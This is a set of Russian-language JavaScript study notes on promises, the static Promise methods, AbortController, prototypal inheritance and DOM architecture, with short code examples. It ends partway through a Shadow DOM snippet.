###### **1. Состояния промиса**
У промиса есть 3 возможных состояния:
1. **`pending`** (ожидание) — начальное состояние, операция не завершена.
2. **`fulfilled`** (выполнено) — операция успешно завершена.
3. **`rejected`** (отклонено) — операция завершилась с ошибкой.

```javascript
const promise = new Promise((resolve, reject) => {
    if (/* успех */) {
        resolve("Успех!"); // переводит в fulfilled
    } else {
        reject("Ошибка!"); // переводит в rejected
    }
});
```

---

###### **2. Обработка результатов**
###### **`.then()` — обработка успешного выполнения**
```javascript
promise.then(
    (result) => console.log(result), // сработает при resolve
    (error) => console.error(error)  // сработает при reject (необязательно)
);
```
###### **`.catch()` — обработка ошибок**
```javascript
promise
    .then((result) => console.log(result))
    .catch((error) => console.error(error)); // ловит reject и ошибки в then
```
###### **`.finally()` — выполнится в любом случае**
```javascript
promise
    .then((result) => console.log(result))
    .catch((error) => console.error(error))
    .finally(() => console.log("Завершено!"));
```

---

###### **3. Цепочки промисов**
Позволяют последовательно выполнять асинхронные операции:
```javascript
fetch("https://api.example.com/data")
    .then((response) => response.json())
    .then((data) => console.log(data))
    .catch((error) => console.error(error));
```
- Если в любом `then` произойдёт ошибка или `reject`, управление перейдёт к ближайшему `catch`.

---

###### **4. Статические методы**
###### **`Promise.resolve()` — создаёт успешный промис**
```javascript
Promise.resolve(42).then((val) => console.log(val)); // 42
```
###### **`Promise.reject()` — создаёт отклонённый промис**
```javascript
Promise.reject("Error").catch((err) => console.log(err)); // Error
```
###### **`Promise.all()` — ждёт выполнения всех промисов**
```javascript
Promise.all([promise1, promise2, promise3])
    .then((results) => console.log(results)) // массив результатов
    .catch((error) => console.error(error)); // если хотя бы один упадёт
```
###### **`Promise.race()` — возвращает первый завершённый промис**
```javascript
Promise.race([promise1, promise2])
    .then((result) => console.log(result)); // результат первого выполнившегося
```

---

###### **5. Async/Await — синтаксический сахар для промисов**
- **`async`** делает функцию асинхронной (она всегда возвращает промис).
- **`await`** ждёт выполнения промиса (работает только внутри `async`).

```javascript
async function fetchData() {
    try {
        const response = await fetch("https://api.example.com/data");
        const data = await response.json();
        console.log(data);
    } catch (error) {
        console.error(error);
    }
}
fetchData();
```

---

###### **6. Примеры**
###### **Пример 1: Таймер с промисом**
```javascript
function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

delay(2000).then(() => console.log("Прошло 2 секунды!"));
```
###### **Пример 2: Загрузка данных с `fetch`**
```javascript
fetch("https://jsonplaceholder.typicode.com/todos/1")
    .then((response) => response.json())
    .then((data) => console.log(data))
    .catch((error) => console.error("Ошибка:", error));
```

---

###### **7. Зачем нужны промисы?**
- Избегают **callback hell** (вложенных колбэков).
- Упрощают обработку ошибок через `.catch()`.
- Позволяют писать линейный код с `async/await`.
- Поддерживают **цепочки вызовов** (`then().then().catch()`).

---

###### **Вывод**
Промисы — это мощный инструмент для работы с асинхронностью в JavaScript. Они делают код чище и удобнее, особенно в сочетании с `async/await`. 🚀
##### статические методы Promise
https://learn.javascript.ru/promise-api

###### Promise API

В классе `Promise` есть 6 статических методов. Давайте познакомимся с ними.

###### Promise.all

Допустим, нам нужно запустить множество промисов параллельно и дождаться, пока все они выполнятся.

Например, параллельно загрузить несколько файлов и обработать результат, когда он готов.

Для этого как раз и пригодится `Promise.all`.

Синтаксис:

```js
let promise = Promise.all(iterable);
```

Метод `Promise.all` принимает массив промисов (может принимать любой перебираемый объект, но обычно используется массив) и возвращает новый промис.

Новый промис завершится, когда завершится весь переданный список промисов, и его результатом будет массив их результатов.

Например, `Promise.all`, представленный ниже, выполнится спустя 3 секунды, его результатом будет массив `[1, 2, 3]`:

```js run
Promise.all([
  new Promise(resolve => setTimeout(() => resolve(1), 3000)), // 1
  new Promise(resolve => setTimeout(() => resolve(2), 2000)), // 2
  new Promise(resolve => setTimeout(() => resolve(3), 1000))  // 3
]).then(alert); // когда все промисы выполнятся, результат будет 1,2,3
// каждый промис даёт элемент массива
```

Обратите внимание, что порядок элементов массива в точности соответствует порядку исходных промисов. Даже если первый промис будет выполняться дольше всех, его результат всё равно будет первым в массиве.

Часто применяемый трюк - пропустить массив данных через map-функцию, которая для каждого элемента создаст задачу-промис, и затем обернуть получившийся массив в `Promise.all`.

Например, если у нас есть массив ссылок, то мы можем загрузить их вот так:

```js run
let urls = [
  'https://api.github.com/users/iliakan',
  'https://api.github.com/users/remy',
  'https://api.github.com/users/jeresig'
];

// Преобразуем каждый URL в промис, возвращённый fetch
let requests = urls.map(url => fetch(url));

// Promise.all будет ожидать выполнения всех промисов
Promise.all(requests)
  .then(responses => responses.forEach(
    response => alert(`${response.url}: ${response.status}`)
  ));
```

А вот пример побольше, с получением информации о пользователях GitHub по их логинам из массива (мы могли бы получать массив товаров по их идентификаторам, логика та же):

```js run
let names = ['iliakan', 'remy', 'jeresig'];

let requests = names.map(name => fetch(`https://api.github.com/users/${name}`));

Promise.all(requests)
  .then(responses => {
    // все промисы успешно завершены
    for(let response of responses) {
      alert(`${response.url}: ${response.status}`); // покажет 200 для каждой ссылки
    }

    return responses;
  })
  // преобразовать массив ответов response в response.json(),
  // чтобы прочитать содержимое каждого
  .then(responses => Promise.all(responses.map(r => r.json())))
  // все JSON-ответы обработаны, users - массив с результатами
  .then(users => users.forEach(user => alert(user.name)));
```

**Если любой из промисов завершится с ошибкой, то промис, возвращённый `Promise.all`, немедленно завершается с этой ошибкой.**

Например:

```js run
Promise.all([
  new Promise((resolve, reject) => setTimeout(() => resolve(1), 1000)),
*!*
  new Promise((resolve, reject) => setTimeout(() => reject(new Error("Ошибка!")), 2000)),
*/!*
  new Promise((resolve, reject) => setTimeout(() => resolve(3), 3000))
]).catch(alert); // Error: Ошибка!
```

Здесь второй промис завершится с ошибкой через 2 секунды. Это приведёт к немедленной ошибке в `Promise.all`, так что выполнится `.catch`: ошибка этого промиса становится ошибкой всего `Promise.all`.

```warn header="В случае ошибки, остальные результаты игнорируются"
Если один промис завершается с ошибкой, то весь `Promise.all` завершается с ней, полностью забывая про остальные промисы в списке. Их результаты игнорируются.

Например, если сделано несколько вызовов `fetch`, как в примере выше, и один не прошёл, то остальные будут всё ещё выполняться, но `Promise.all` за ними уже не смотрит. Скорее всего, они так или иначе завершатся, но их результаты будут проигнорированы.

`Promise.all` ничего не делает для их отмены, так как в промисах вообще нет концепции "отмены". В главе <info:fetch-abort> мы рассмотрим `AbortController`, который помогает с этим, но он не является частью Promise API.
```

````smart header="`Promise.all(iterable)` разрешает передавать не-промисы в `iterable` (перебираемом объекте)"
Обычно, `Promise.all(...)` принимает перебираемый объект промисов (чаще всего массив). Но если любой из этих объектов не является промисом, он передаётся в итоговый массив "как есть".

Например, здесь результат: `[1, 2, 3]`

```js run
Promise.all([
  new Promise((resolve, reject) => {
    setTimeout(() => resolve(1), 1000)
  }),
  2,
  3  
]).then(alert); // 1, 2, 3
```

Таким образом, мы можем передавать уже готовые значения, которые не являются промисами, в `Promise.all`, иногда это бывает удобно.

###### Promise.allSettled


Синтаксис:

```js
let promise = Promise.allSettled(iterable);
```

`Promise.all` завершается с ошибкой, если она возникает в любом из переданных промисов. Это подходит для ситуаций "всё или ничего", когда нам нужны *все* результаты для продолжения:

```js
Promise.all([
  fetch('/template.html'),
  fetch('/style.css'),
  fetch('/data.json')
]).then(render); // методу render нужны результаты всех fetch
```

Метод `Promise.allSettled` всегда ждёт завершения всех промисов. В массиве результатов будет

- `{status:"fulfilled", value:результат}` для успешных завершений,
- `{status:"rejected", reason:ошибка}` для ошибок.

Например, мы хотели бы загрузить информацию о множестве пользователей. Даже если в каком-то запросе ошибка, нас всё равно интересуют остальные.

Используем для этого `Promise.allSettled`:

```js run
let urls = [
  'https://api.github.com/users/iliakan',
  'https://api.github.com/users/remy',
  'https://no-such-url'
];

Promise.allSettled(urls.map(url => fetch(url)))
  .then(results => { // (*)
    results.forEach((result, num) => {
      if (result.status == "fulfilled") {
        alert(`${urls[num]}: ${result.value.status}`);
      }
      if (result.status == "rejected") {
        alert(`${urls[num]}: ${result.reason}`);
      }
    });
  });
```

Массив `results` в строке `(*)` будет таким:
```js
[
  {status: 'fulfilled', value: ...объект ответа...},
  {status: 'fulfilled', value: ...объект ответа...},
  {status: 'rejected', reason: ...объект ошибки...}
]
```

То есть, для каждого промиса у нас есть его статус и значение/ошибка.

###### Полифил

Если браузер не поддерживает `Promise.allSettled`, для него легко сделать полифил:

```js
if(!Promise.allSettled) {
  Promise.allSettled = function(promises) {
    return Promise.all(promises.map(p => Promise.resolve(p).then(value => ({
      status: 'fulfilled',
      value: value
    }), error => ({
      status: 'rejected',
      reason: error
    }))));
  };
}
```

В этом коде `promises.map` берёт аргументы, превращает их в промисы (на всякий случай) и добавляет каждому обработчик `.then`.

Этот обработчик превращает успешный результат `value` в `{state:'fulfilled', value: value}`, а ошибку `error` в `{state:'rejected', reason: error}`. Это как раз и есть формат результатов `Promise.allSettled`.

Затем мы можем использовать `Promise.allSettled`, чтобы получить результаты *всех* промисов, даже если при выполнении какого-то возникнет ошибка.

###### Promise.race

Метод очень похож на `Promise.all`, но ждёт только первый *выполненный* промис, из которого берёт результат (или ошибку).

Синтаксис:

```js
let promise = Promise.race(iterable);
```

Например, тут результат будет `1`:

```js run
Promise.race([
  new Promise((resolve, reject) => setTimeout(() => resolve(1), 1000)),
  new Promise((resolve, reject) => setTimeout(() => reject(new Error("Ошибка!")), 2000)),
  new Promise((resolve, reject) => setTimeout(() => resolve(3), 3000))
]).then(alert); // 1
```

Быстрее всех выполнился первый промис, он и дал результат. После этого остальные промисы игнорируются.

###### Promise.any

Метод очень похож на `Promise.race`, но ждёт только первый *успешно выполненный* промис, из которого берёт результат. 

Если ни один из переданных промисов не завершится успешно, тогда возвращённый объект Promise будет отклонён с помощью `AggregateError` – специального объекта ошибок, который хранит все ошибки промисов в своём свойстве `errors`.

Синтаксис:

```js
let promise = Promise.any(iterable);
```

Например, здесь, результатом будет `1`:

```js run
Promise.any([
  new Promise((resolve, reject) => setTimeout(() => reject(new Error("Ошибка!")), 1000)),
  new Promise((resolve, reject) => setTimeout(() => resolve(1), 2000)),
  new Promise((resolve, reject) => setTimeout(() => resolve(3), 3000))
]).then(alert); // 1
```

Первый промис в этом примере был самым быстрым, но он был отклонён, поэтому результатом стал второй. После того, как первый успешно выполненный промис "выиграет гонку", все дальнейшие результаты будут проигнорированы.

Вот пример, в котором все промисы отклоняются:

```js run
Promise.any([
  new Promise((resolve, reject) => setTimeout(() => reject(new Error("Ошибка!")), 1000)),
  new Promise((resolve, reject) => setTimeout(() => reject(new Error("Ещё одна ошибка!")), 2000))
]).catch(error => {
  console.log(error.constructor.name); // AggregateError
  console.log(error.errors[0]); // Error: Ошибка!
  console.log(error.errors[1]); // Error: Ещё одна ошибка!
});
```

Как вы можете видеть, объекты ошибок для отклонённых промисов доступны в свойстве `errors` объекта `AggregateError`.

###### Promise.resolve/reject

Методы `Promise.resolve` и `Promise.reject` редко используются в современном коде, так как синтаксис `async/await` (мы рассмотрим его [чуть позже](info:async-await)) делает их, в общем-то, не нужными.

Мы рассмотрим их здесь для полноты картины, а также для тех, кто по каким-то причинам не может использовать `async/await`.

###### Promise.resolve

- `Promise.resolve(value)` создаёт успешно выполненный промис с результатом `value`.

То же самое, что:

```js
let promise = new Promise(resolve => resolve(value));
```

Этот метод используют для совместимости: когда ожидается, что функция возвратит именно промис.

Например, функция `loadCached` ниже загружает URL и запоминает (кеширует) его содержимое. При будущих вызовах с тем же URL он тут же читает предыдущее содержимое из кеша, но использует `Promise.resolve`, чтобы сделать из него промис, для того, чтобы возвращаемое значение всегда было промисом:

```js
let cache = new Map();

function loadCached(url) {
  if (cache.has(url)) {
*!*
    return Promise.resolve(cache.get(url)); // (*)
*/!*
  }

  return fetch(url)
    .then(response => response.text())
    .then(text => {
      cache.set(url,text);
      return text;
    });
}
```

Мы можем писать `loadCached(url).then(…)`, потому что функция `loadCached` всегда возвращает промис. Мы всегда можем использовать `.then` после `loadCached`. Это и есть цель использования `Promise.resolve` в строке `(*)`.

###### Promise.reject

- `Promise.reject(error)` создаёт промис, завершённый с ошибкой `error`.

То же самое, что:

```js
let promise = new Promise((resolve, reject) => reject(error));
```

На практике этот метод почти никогда не используется.

###### Итого

Мы ознакомились с шестью статическими методами класса `Promise`:

1. `Promise.all(promises)` -- ожидает выполнения всех промисов и возвращает массив с результатами. Если любой из указанных промисов вернёт ошибку, то результатом работы `Promise.all` будет эта ошибка, результаты остальных промисов будут игнорироваться.
2. `Promise.allSettled(promises)` (добавлен недавно) -- ждёт, пока все промисы завершатся и возвращает их результаты в виде массива с объектами, у каждого объекта два свойства:
    - `status`: `"fulfilled"`, если выполнен успешно или `"rejected"`, если ошибка,
    - `value` - результат, если успешно или `reason` - ошибка, если нет.
3. `Promise.race(promises)` -- ожидает первый *выполненный* промис, который становится его результатом, остальные игнорируются.
4. `Promise.any(promises)` (добавлен недавно) -- ожидает первый *успешно выполненный* промис, который становится его результатом, остальные игнорируются. Если все переданные промисы отклонены, [`AggregateError`](mdn:js/AggregateError) становится ошибкой `Promise.any`.
5. `Promise.resolve(value)` -- возвращает успешно выполнившийся промис с результатом `value`.
6. `Promise.reject(error)` -- возвращает промис с ошибкой `error`.


##### Fetch: прерывание запроса

https://developer.mozilla.org/en-US/docs/Web/API/AbortController
https://habr.com/ru/articles/731644/
https://doka.guide/js/abort-controller/

Как мы знаем, метод `fetch` возвращает промис. А в JavaScript в целом нет понятия "отмены" промиса. Как же прервать запрос `fetch`?

Для таких целей существует специальный встроенный объект: `AbortController`, который можно использовать для отмены не только `fetch`, но и других асинхронных задач.

Использовать его достаточно просто:

- Шаг 1: создаём контроллер:

    ```js
    let controller = new AbortController();
    ```

    Контроллер `controller` - чрезвычайно простой объект.

    - Он имеет единственный метод `abort()` и единственное свойство `signal`.
    - При вызове `abort()`:
        - генерируется событие с именем `abort` на объекте `controller.signal`
        - свойство `controller.signal.aborted` становится равным `true`.

    Все, кто хочет узнать о вызове `abort()`, ставят обработчики на `controller.signal`, чтобы отслеживать его.

    Вот так (пока без `fetch`):

    ```js run
    let controller = new AbortController();
    let signal = controller.signal;

    // срабатывает при вызове controller.abort()
    signal.addEventListener('abort', () => alert("отмена!"));

    controller.abort(); // отмена!

    alert(signal.aborted); // true
    ```

- Шаг 2: передайте свойство `signal` опцией в метод `fetch`:

    ```js
    let controller = new AbortController();
    fetch(url, {
      signal: controller.signal
    });
    ```

    Метод `fetch` умеет работать с `AbortController`, он слушает событие `abort` на `signal`.

- Шаг 3: чтобы прервать выполнение `fetch`, вызовите `controller.abort()`:

    ```js
    controller.abort();
    ```

    Вот и всё: `fetch` получает событие из `signal` и прерывает запрос.

Когда `fetch` отменяется, его промис завершается с ошибкой `AbortError`, поэтому мы должны обработать её, например, в `try..catch`:

```js run async
// прервать через 1 секунду
let controller = new AbortController();
setTimeout(() => controller.abort(), 1000);

try {
  let response = await fetch('/article/fetch-abort/demo/hang', {
    signal: controller.signal
  });
} catch(err) {
  if (err.name == 'AbortError') { // обработать ошибку от вызова abort()
    alert("Прервано!");
  } else {
    throw err;
  }
}
```

**`AbortController` - масштабируемый, он позволяет отменить несколько вызовов `fetch` одновременно.**

Например, здесь мы запрашиваем много URL параллельно, и контроллер прерывает их все:

```js
let urls = [...]; // список URL для параллельных fetch

let controller = new AbortController();

let fetchJobs = urls.map(url => fetch(url, {
  signal: controller.signal
}));

let results = await Promise.all(fetchJobs);

// если откуда-то вызвать controller.abort(),
// то это прервёт все вызовы fetch
```

Если у нас есть собственные асинхронные задачи, отличные от `fetch`, мы можем использовать один `AbortController` для их остановки вместе с `fetch`.

Нужно лишь слушать его событие `abort`:

```js
let urls = [...];
let controller = new AbortController();

let ourJob = new Promise((resolve, reject) => { // наша задача
  ...
  controller.signal.addEventListener('abort', reject);
});

let fetchJobs = urls.map(url => fetch(url, { // запросы fetch
  signal: controller.signal
}));

// ожидать выполнения нашей задачи и всех запросов
let results = await Promise.all([...fetchJobs, ourJob]);

// вызов откуда-нибудь ещё:
// controller.abort() прервёт все вызовы fetch и наши задачи
```

Так что `AbortController` существует не только для `fetch`, это универсальный объект для отмены асинхронных задач, в `fetch` встроена интеграция с ним.


##### Прототипное наследование

В программировании мы часто хотим взять что-то и расширить.

Например, у нас есть объект `user` со своими свойствами и методами, и мы хотим создать объекты `admin` и `guest` как его слегка изменённые варианты. Мы хотели бы повторно использовать то, что есть у объекта `user`, не копировать/переопределять его методы, а просто создать новый объект на его основе.

*Прототипное наследование* — это возможность языка, которая помогает в этом.

###### [[Prototype]]

В JavaScript объекты имеют специальное скрытое свойство `[[Prototype]]` (так оно названо в спецификации), которое либо равно `null`, либо ссылается на другой объект. Этот объект называется "прототип":

![prototype](object-prototype-empty.svg)

Прототип даёт нам немного "магии". Когда мы хотим прочитать свойство из `object`, а оно отсутствует, JavaScript автоматически берёт его из прототипа. В программировании такой механизм называется "прототипным наследованием". Многие интересные возможности языка и техники программирования основываются на нём.

Свойство `[[Prototype]]` является внутренним и скрытым, но есть много способов задать его.

Одним из них является использование `__proto__`, например так:

```js
let animal = {
  eats: true
};

let rabbit = {
  jumps: true
};

*!*
rabbit.__proto__ = animal;
*/!*
```

Если мы ищем свойство в `rabbit`, а оно отсутствует, JavaScript автоматически берёт его из `animal`.

Например:

```js run
let animal = {
  eats: true
};

let rabbit = {
  jumps: true
};

*!*
rabbit.__proto__ = animal; // (*)
*/!*

// теперь мы можем найти оба свойства в rabbit:
*!*
alert( rabbit.eats ); // true (**)
*/!*
alert( rabbit.jumps ); // true
```

Здесь строка `(*)` устанавливает `animal` как прототип для `rabbit`.

Затем, когда `alert` пытается прочитать свойство `rabbit.eats` `(**)`, его нет в `rabbit`, поэтому JavaScript следует по ссылке `[[Prototype]]` и находит его в `animal` (смотрите снизу вверх):

![](proto-animal-rabbit.svg)

Здесь мы можем сказать, что "`animal` является прототипом `rabbit`" или "`rabbit` прототипно наследует от `animal`".

Так что если у `animal` много полезных свойств и методов, то они автоматически становятся доступными у `rabbit`. Такие свойства называются "унаследованными".

Если у нас есть метод в `animal`, он может быть вызван на `rabbit`:

```js run
let animal = {
  eats: true,
*!*
  walk() {
    alert("Animal walk");
  }
*/!*
};

let rabbit = {
  jumps: true,
  __proto__: animal
};

// walk взят из прототипа
*!*
rabbit.walk(); // Animal walk
*/!*
```

Метод автоматически берётся из прототипа:

![](proto-animal-rabbit-walk.svg)

Цепочка прототипов может быть длиннее:

```js run
let animal = {
  eats: true,
  walk() {
    alert("Animal walk");
  }
};

let rabbit = {
  jumps: true,
*!*
  __proto__: animal
*/!*
};

let longEar = {
  earLength: 10,
*!*
  __proto__: rabbit
*/!*
};

// walk взят из цепочки прототипов
longEar.walk(); // Animal walk
alert(longEar.jumps); // true (из rabbit)
```

![](proto-animal-rabbit-chain.svg)

Теперь, если мы прочтём что-нибудь из `longEar`, и оно будет отсутствовать, JavaScript будет искать его в `rabbit`, а затем в `animal`.

Есть только два ограничения:

1. Ссылки не могут идти по кругу. JavaScript выдаст ошибку, если мы попытаемся назначить `__proto__` по кругу.
2. Значение `__proto__` может быть объектом или `null`. Другие типы игнорируются.

Это вполне очевидно, но всё же: может быть только один `[[Prototype]]`. Объект не может наследоваться от двух других объектов.

```smart header="Свойство `__proto__` — исторически обусловленный геттер/сеттер для `[[Prototype]]`"
Это распространённая ошибка начинающих разработчиков - не знать разницы между этими двумя понятиями.

Обратите внимание, что `__proto__` — *не то же самое*, что внутреннее свойство `[[Prototype]]`. Это геттер/сеттер для `[[Prototype]]`. Позже мы увидим ситуации, когда это имеет значение, а пока давайте просто будем иметь это в виду, поскольку мы строим наше понимание языка JavaScript.

Свойство `__proto__` немного устарело, оно существует по историческим причинам. Современный JavaScript предполагает, что мы должны использовать функции `Object.getPrototypeOf/Object.setPrototypeOf` вместо того, чтобы получать/устанавливать прототип. Мы также рассмотрим эти функции позже.

По спецификации `__proto__` должен поддерживаться только браузерами, но по факту все среды, включая серверную, поддерживают его. Так что мы вполне безопасно его используем.

Далее мы будем в примерах использовать `__proto__`, так как это самый короткий и интуитивно понятный способ установки и чтения прототипа.


###### Операция записи не использует прототип

Прототип используется только для чтения свойств.

Операции записи/удаления работают напрямую с объектом.

В приведённом ниже примере мы присваиваем `rabbit` собственный метод `walk`:

```js run
let animal = {
  eats: true,
  walk() {
    /* этот метод не будет использоваться в rabbit */  
  }
};

let rabbit = {
  __proto__: animal
};

*!*
rabbit.walk = function() {
  alert("Rabbit! Bounce-bounce!");
};
*/!*

rabbit.walk(); // Rabbit! Bounce-bounce!


Теперь вызов `rabbit.walk()` находит метод непосредственно в объекте и выполняет его, не используя прототип:

![](proto-animal-rabbit-walk-2.svg)

Свойства-аксессоры - исключение, так как запись в него обрабатывается функцией-сеттером. То есть это фактически вызов функции.

По этой причине `admin.fullName` работает корректно в приведённом ниже коде:

```js run
let user = {
  name: "John",
  surname: "Smith",

  set fullName(value) {
    [this.name, this.surname] = value.split(" ");
  },

  get fullName() {
    return `${this.name} ${this.surname}`;
  }
};

let admin = {
  __proto__: user,
  isAdmin: true
};

alert(admin.fullName); // John Smith (*)

// срабатывает сеттер!
admin.fullName = "Alice Cooper"; // (**)
alert(admin.name); // Alice
alert(admin.surname); // Cooper
```

Здесь в строке `(*)` свойство `admin.fullName` имеет геттер в прототипе `user`, поэтому вызывается он. В строке `(**)` свойство также имеет сеттер в прототипе, который и будет вызван.

###### Значение "this"

В приведённом выше примере может возникнуть интересный вопрос: каково значение `this` внутри `set fullName(value)`? Куда записаны свойства `this.name` и `this.surname`: в `user` или в `admin`?

Ответ прост: прототипы никак не влияют на `this`.

**Неважно, где находится метод: в объекте или его прототипе. При вызове метода `this` — всегда объект перед точкой.**

Таким образом, вызов сеттера `admin.fullName=` в качестве `this` использует `admin`, а не `user`.

Это на самом деле очень важная деталь, потому что у нас может быть большой объект со множеством методов, от которого можно наследовать. Затем наследующие объекты могут вызывать его методы, но они будут изменять своё состояние, а не состояние объекта-родителя.

Например, здесь `animal` представляет собой "хранилище методов", и `rabbit` использует его.

Вызов `rabbit.sleep()` устанавливает `this.isSleeping` для объекта `rabbit`:

```js run
// методы animal
let animal = {
  walk() {
    if (!this.isSleeping) {
      alert(`I walk`);
    }
  },
  sleep() {
    this.isSleeping = true;
  }
};

let rabbit = {
  name: "White Rabbit",
  __proto__: animal
};

// модифицирует rabbit.isSleeping
rabbit.sleep();

alert(rabbit.isSleeping); // true
alert(animal.isSleeping); // undefined (нет такого свойства в прототипе)
```

Картинка с результатом:

![](proto-animal-rabbit-walk-3.svg)

Если бы у нас были другие объекты, такие как `bird`, `snake` и т.д., унаследованные от `animal`, они также получили бы доступ к методам `animal`. Но `this` при вызове каждого метода будет соответствовать объекту (перед точкой), на котором происходит вызов, а не `animal`. Поэтому, когда мы записываем данные в `this`, они сохраняются в этих объектах.

В результате методы являются общими, а состояние объекта — нет.

###### Цикл for..in

Цикл `for..in` проходит не только по собственным, но и по унаследованным свойствам объекта.

Например:

```js run
let animal = {
  eats: true
};

let rabbit = {
  jumps: true,
  __proto__: animal
};

*!*
// Object.keys возвращает только собственные ключи
alert(Object.keys(rabbit)); // jumps
*/!*

*!*
// for..in проходит и по своим, и по унаследованным ключам
for(let prop in rabbit) alert(prop); // jumps, затем eats
*/!*
```

Если унаследованные свойства нам не нужны, то мы можем отфильтровать их при помощи встроенного метода [obj.hasOwnProperty(key)](mdn:js/Object/hasOwnProperty): он возвращает `true`, если у `obj` есть собственное, не унаследованное, свойство с именем `key`.

Пример такой фильтрации:

```js run
let animal = {
  eats: true
};

let rabbit = {
  jumps: true,
  __proto__: animal
};

for(let prop in rabbit) {
  let isOwn = rabbit.hasOwnProperty(prop);

  if (isOwn) {
    alert(`Our: ${prop}`); // Our: jumps
  } else {
    alert(`Inherited: ${prop}`); // Inherited: eats
  }
}
```

В этом примере цепочка наследования выглядит так: `rabbit` наследует от `animal`, который наследует от `Object.prototype` (так как `animal` - литеральный объект `{...}`, то это по умолчанию), а затем `null` на самом верху:

![](rabbit-animal-object.svg)

Заметим ещё одну деталь. Откуда взялся метод `rabbit.hasOwnProperty`? Мы его явно не определяли. Если посмотреть на цепочку прототипов, то видно, что он берётся из `Object.prototype.hasOwnProperty`. То есть он унаследован.

...Но почему `hasOwnProperty` не появляется в цикле `for..in` в отличие от `eats` и `jumps`? Он ведь перечисляет все унаследованные свойства.

Ответ простой: оно не перечислимо. То есть у него внутренний флаг `enumerable` стоит `false`, как и у других свойств `Object.prototype`. Поэтому оно и не появляется в цикле.

```smart header="Почти все остальные методы получения ключей/значений игнорируют унаследованные свойства"
Почти все остальные методы, получающие ключи/значения, такие как `Object.keys`, `Object.values` и другие - игнорируют унаследованные свойства.

Они учитывают только свойства самого объекта, не его прототипа.
```

###### Итого

- В JavaScript все объекты имеют скрытое свойство `[[Prototype]]`, которое является либо другим объектом, либо `null`.
- Мы можем использовать `obj.__proto__` для доступа к нему (исторически обусловленный геттер/сеттер, есть другие способы, которые скоро будут рассмотрены).
- Объект, на который ссылается `[[Prototype]]`, называется "прототипом".
- Если мы хотим прочитать свойство `obj` или вызвать метод, которого не существует у `obj`, тогда JavaScript попытается найти его в прототипе.
- Операции записи/удаления работают непосредственно с объектом, они не используют прототип (если это обычное свойство, а не сеттер).
- Если мы вызываем `obj.method()`, а метод при этом взят из прототипа, то `this` всё равно ссылается на `obj`. Таким образом, методы всегда работают с текущим объектом, даже если они наследуются.
- Цикл `for..in` перебирает как свои, так и унаследованные свойства. Остальные методы получения ключей/значений работают только с собственными свойствами объекта.

##### DOM

###### Архитектура DOM

DOM представляет собой **иерархическое дерево объектов**, где каждый узел соответствует части документа. Эта модель:

1. **Не зависит от платформы и языка** - хотя мы рассматриваем JavaScript-реализацию, DOM существует как стандарт для различных языков
2. **Ориентирована на объекты** - каждый узел является объектом с свойствами и методами
3. **Логически структурирована** - отражает семантическую структуру документа

###### Типы узлов (Node types)

Полная классификация узлов согласно спецификации:

| Константа | Значение | Описание |
|-----------|----------|----------|
| `Node.ELEMENT_NODE` | 1 | Элемент (тег) |
| `Node.ATTRIBUTE_NODE` | 2 | Атрибут (устарело в DOM4) |
| `Node.TEXT_NODE` | 3 | Текстовый узел |
| `Node.CDATA_SECTION_NODE` | 4 | CDATA-секция |
| `Node.PROCESSING_INSTRUCTION_NODE` | 7 | Инструкция обработки XML |
| `Node.COMMENT_NODE` | 8 | Комментарий |
| `Node.DOCUMENT_NODE` | 9 | Документ (корень) |
| `Node.DOCUMENT_TYPE_NODE` | 10 | <!DOCTYPE> |
| `Node.DOCUMENT_FRAGMENT_NODE` | 11 | Фрагмент документа |

###### Детали процесса парсинга

###### Фазы построения DOM

1. **Токенизация**:
   - Лексер разбивает HTML на токены (старт-теги, энд-теги, атрибуты и т.д.)
   - Особые случаи:
     - Автозакрытие тегов (`<img>`)
     - Обработка некорректного HTML
     - Учет специфичных правил (например, для `<table>`)

2. **Построение дерева**:
   - Используется стек для отслеживания вложенности
   - Алгоритм восстановления при ошибках включает:
     - Неявное закрытие тегов
     - Перемещение элементов в правильный контекст
     - Удаление лишних закрывающих тегов

3. **Построение CSSOM** (параллельно):
   - Каскадные таблицы стилей анализируются в CSSOM
   - Особенности:
     - CSS парсится справа налево для селекторов
     - Специфичность и наследование вычисляются на этом этапе

###### Взаимодействие с JavaScript

**Блокирующая природа парсинга**:
- Когда парсер встречает `<script>`, он должен:
  1. Остановить парсинг HTML
  2. Загрузить скрипт (если внешний)
  3. Выполнить скрипт
  4. Продолжить парсинг

**Оптимизации**:
- `async` - скрипт выполняется асинхронно после загрузки
- `defer` - скрипт выполняется после парсинга, но до DOMContentLoaded
- `type="module"` - по умолчанию ведет себя как defer

###### Внутреннее представление DOM в браузерах

Современные браузеры используют сложные оптимизации:

1. **Инкрементальное обновление**:
   - Изменения DOM применяются минимально необходимым образом
   - Перестроение всего дерева не происходит

2. **Слои рендеринга** (Render Layers):
   - Браузер группирует элементы в слои для эффективного перерисовывания
   - Свойства типа `will-change`, `transform` создают новые слои

3. **Отложенное выполнение**:
   - Некоторые операции (например, чтение layout-свойств) могут вызывать синхронный пересчет ("layout thrashing")

###### Производительность и оптимизация

###### Критические метрики

1. **Time to First Byte (TTFB)** - время до начала получения документа
2. **DOMContentLoaded** - момент полного парсинга HTML (без ожидания стилей и изображений)
3. **Load Event** - полная загрузка всех ресурсов

###### Оптимизационные стратегии

1. **Минимизация глубины DOM**:
   - Оптимально 32 узла в глубину
   - Максимально 60 узлов (после чего производительность падает)

2. **Эффективные селекторы**:
   - Избегайте сложных селекторов типа `div > ul > li > a`
   - Классы обычно быстрее, чем атрибуты

3. **Использование DocumentFragment**:
   ```javascript
   const fragment = document.createDocumentFragment();
   // Добавляем элементы во фрагмент
   fragment.appendChild(createElement('div'));
   // Однократное добавление в DOM
   document.body.appendChild(fragment);
   ```

###### Виртуальный DOM: детали реализации

###### Алгоритм сравнения (Diffing)

1. **Поуровневое сравнение**:
   - React и другие библиотеки сравнивают деревья уровень за уровнем
   - Если тип элемента изменился, поддерево полностью перестраивается

2. **Ключи (Keys)**:
   - Позволяют отслеживать идентичность элементов при изменениях порядка
   - Оптимизируют переупорядочивание списков

3. **Пакетное обновление**:
   - Изменения накапливаются и применяются одним пакетом
   - Избегает множественных перерисовок

###### Преимущества и недостатки

**Преимущества**:
- Абстракция от нативного DOM API
- Более декларативный подход
- Оптимизированные обновления

**Недостатки**:
- Дополнительное потребление памяти
- Накладные расходы на сравнение деревьев
- В некоторых случаях может быть менее эффективен, чем ручное управление


###### Расширенные концепции Shadow DOM

Компонентная модель, обеспечивающая инкапсуляцию:
```javascript
const element = document.createElement('div');
const shadowRoot = element.attachShadow({ mode: 'open' });
